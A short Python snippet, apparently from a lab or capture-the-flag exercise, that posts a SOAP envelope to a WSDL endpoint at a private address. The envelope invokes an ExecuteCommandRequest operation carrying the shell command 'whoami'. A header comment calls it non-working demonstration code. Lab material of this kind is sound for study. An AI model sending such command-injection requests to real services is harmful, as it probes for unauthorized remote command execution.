
# This is NOT WORKING Python code for demonstration of how SOAP-XML requests are normally made, and how ExecuteCommandRequest is restricted ACCESS.

import requests

payload = '<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><ExecuteCommandRequest xmlns="http://tempuri.org/"><cmd>whoami</cmd></ExecuteCommandRequest></soap:Body></soap:Envelope>'

print(requests.post("http://10.129.25.120:3002/wsdl", data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content)
